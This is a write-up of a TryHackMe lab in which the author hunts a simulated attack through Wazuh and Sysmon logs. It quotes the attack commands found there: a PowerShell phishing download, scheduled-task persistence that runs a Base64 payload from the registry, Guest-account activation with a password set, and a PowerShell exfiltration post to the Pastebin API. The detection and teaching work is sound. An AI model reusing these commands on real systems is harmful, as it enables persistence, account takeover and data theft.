# Wazuh + Sysmon Endpoint Investigation: Hunting Real Attacks

## Objectives

- Investigated a full red-team simulation inside TryHackMe’s Wazuh lab using live Sysmon + Windows Event Logs from Apr 29, 2024 (12:00–20:00).
- Tracked phishing delivery via PowerShell, scheduled-task persistence with Base64 registry payloads, Guest account activation + privilege escalation, LSASS credential dumping, and final data exfiltration to Pastebin—all from a single Wazuh dashboard.
- Turned thousands of endpoint events into a complete kill-chain timeline with zero local tools, proving Wazuh is a SOC force multiplier in a safe, isolated environment.
- VM: https://tryhackme.com/room/mondaymonitor

## Tools Used

- **Wazuh Dashboard** (Security Events → Monday_Monitor query, time-range filtering, rule.id + eventID filters)
- **Sysmon + Windows Event Logs** (Event ID 1 process creation, 3 network, 10 process access, 4738 user changes)
- **CyberChef** (Base64 decoding registry payloads)
- **Column customization** (parentCommandLine, commandLine, Message fields for instant visibility)

# Investigation

## Navigate Through the Endpoint Logs

**Scenario:**

Swiftspend Finance is testing its endpoint security using **Wazuh** and **Sysmon**. My mission is to investigate logs from Apr 29, 2024 (12:00:00 – 20:00:00) to detect suspicious processes, network connections, and potential malware activity.

---

## Steps I Followed

### 1. Start the VM

- Clicked **Start Machine**.
- Waited ~5 minutes for environment setup.

### 2. Access Wazuh Dashboard

- Opened browser at: `https://10-10-184-145.reverse-proxy-eu-west-1.tryhackme.com/`
- Logged in with provided credentials.
    
    ![image.png](image.png)
    

### 3. Navigate to Security Events

- Modules → **Security Events**
- Loaded the saved query **Monday_Monitor**.
    
    ![image.png](image%201.png)
    
- Filtered logs for **Apr 29, 2024**, **12:00:00 – 20:00:00**.
    
    ![image.png](image%202.png)
    

---

## Investigating Downloaded Files

**Concept:**

- Wazuh + Sysmon monitor process creation, file downloads, scheduled tasks, and suspicious activity.
- Sysmon Event ID 1 logs **process creation** including command line, parent process, hashes, and user info.

**Action:**

- Filtered logs for HTTP or `rule.id: 255042`.
    
    ![image.png](image%203.png)
    
- Found a suspicious PowerShell download:
    
    ```powershell
    "powershell.exe" & {
        $url = 'http://localhost/PhishingAttachment.xlsm'
        Invoke-WebRequest -Uri $url -OutFile $env:TEMP\SwiftSpend_Financial_Expenses.xlsm
    }
    ```
    
    ![image.png](image%204.png)
    

**Observations:**

- PowerShell downloads a file to Temp folder.
- Original filename: `PhishingAttachment.xlsm`
- Saved on host as: `SwiftSpend_Financial_Expenses.xlsm`

**Key Concept:**

- Downloading files via PowerShell is a common **malware/phishing technique**.

---

## Investigating Scheduled Tasks

**Concept:**

- Sysmon logs **schtasks.exe** creating scheduled tasks.
- Scheduled tasks can achieve **persistence** and are often used in **MITRE ATT&CK T1053.005**.
- Malicious scripts can hide in **registry keys** and be Base64-encoded to avoid detection.

**Action:**

- Filtered events for `schtasks.exe`.
- Checked `parentCommandLine`:
    
    ![image.png](image%205.png)
    
    ```bash
    "cmd.exe" /c "reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f &
    schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min "" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\ATOMIC-T1053.005).test)))" /sc daily /st 12:34"
    ```
    

**Answers:**

- **Full command run:** same as above.
- **Scheduled task time:** 12:34
- **Decoded Base64 payload:**
    
    Use Cyberchef to decode and got this url.
    
    ![image.png](image%206.png)
    

**Key Concepts:**

- Base64 in registry hides true intent.
- IEX executes decoded PowerShell commands.
- This is an example of **obfuscation and persistence in endpoint attacks**.

---

## Investigating User Account Changes

**Concept:**

- Windows Event ID 4738 tracks user account modifications.
- Malicious actors can activate **Guest accounts** and set passwords for persistence.

**Action:**

- Used filter for **eventID** and set value to 4738 (Event ID that tracks user account mods).
    
    ![image.png](image%207.png)
    
- Here I found two events related to the Guest Account.
    
    But events (for good reason) do not mention a password though. So I removed the filter, and started looking around the timestamp during which these two events triggered, so that I can find other relevant events.
    
    ![image.png](image%208.png)
    
    Directly before the first of these events we see the following event:
    
    ![image.png](image%209.png)
    
    ![image.png](image%2010.png)
    
- Here the account is being created
    
    ```jsx
    net1 user guest /active:yes
    ```
    
- Better to put this field as column of the table, it makes it much easier to see what is going on.
    
    ![image.png](image%2011.png)
    
- Found commands changing Guest password:
    
    In addition, to events adding the Guest account to the Administrators group (bad idea!)
    
    ![image.png](image%2012.png)
    
    There are also two events which change the guest account password using net.exe:
    
    ![image.png](image%2013.png)
    
    ```bash
    net.exe user guest I_AM_M0NIT0R1NG
    net1 user guest I_AM_M0NIT0R1NG
    ```
    

**Answer:** `I_AM_M0NIT0R1NG`

---

## Investigating Credential Dumping

**Concept:**

- MITRE ATT&CK T1003.001 describes dumping **LSASS credentials**.
- Red team techniques simulate stealing sensitive info without causing real damage.

**Action:**

- Found relevant Sysmon events 10–11 events after Guest account changes.
    
    ![Dumping-credentials-1300x141.png.webp](Dumping-credentials-1300x141.png.webp)
    
- Tool used: `memotech.exe`

---

## Investigating Data Exfiltration

**Concept:**

- Powershell can send data to remote APIs using **Invoke-RestMethod**.
- Exfiltrated content often contains **flags or secrets**.

**Action:**

- Kept scrolling and came across the data extraction part
    
    ![Powershell-command-with-flag.png.webp](Powershell-command-with-flag.png.webp)
    
- Powershell command with flag
    
    ```jsx
    \"powershell.exe\" & {$apiKey = \\\"\"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\\\"\" $content = \\\"\"secrets, api keys, passwords, THM{M0N1T0R_1$_1N_3FF3CT}, confidential, private, wall, redeem...\\\"\" $url = \\\"\"[https://pastebin.com/api/api_post.php\\\\\\"\\"](https://pastebin.com/api/api_post.php%5C%5C%5C%5C%5C%5C%22%5C%5C%22) $postData = @{   api_dev_key   = $apiKey   api_option    = \\\"\"paste\\\"\"   api_paste_code = $content } $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData Write-Host \\\"\"Your paste URL: $response\\\"\"}
    ```
    
    Here I can see a REST call getting made, which includes a flag in its content.
    
    **Answer (flag):** `THM{M0N1T0R_1$_1N_3FF3CT}`
    
- Found event sending data to Pastebin API:
    
    ```powershell
    $apiKey = "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0"
    $content = "secrets, api keys, passwords, THM{M0N1T0R_1$_1N_3FF3CT}, confidential, private, wall, redeem..."
    $url = "https://pastebin.com/api/api_post.php"
    Invoke-RestMethod -Uri $url -Method Post -Body $postData
    ```
    

---

# Lessons Learned

- Wazuh saved queries (Monday_Monitor) + time-range = instant context in chaotic logs.
- PowerShell downloading .xlsm to TEMP = phishing 99% of the time—filter rule.id:255042 first.
- schtasks.exe + reg add + Base64 in HKCU = textbook T1053.005 persistence—always check parentCommandLine.
- Guest account activation + net.exe password changes = lateral movement red flag; scroll 10 events around 4738.
- memotech.exe accessing lsass.exe (Event ID 10) = credential dumping confirmed—no guessing needed.
- Safe VM + Wazuh dashboard = I just hunted a full APT simulation without installing a single agent.

# Socials

**Repository:** https://github.com/RahulCyberX/Endpoint-Security-Monitoring

**Medium Article:** https://medium.com/@rahulcyberx/monday-monitor-endpoint-security-monitoring-thm-2025-32ba08d5b789?source=your_stories_outbox---writer_outbox_published-----------------------------------------

**TryHackMe Profile:** https://tryhackme.com/p/0xRahuL

**Github Profile:** https://github.com/RahulCyberX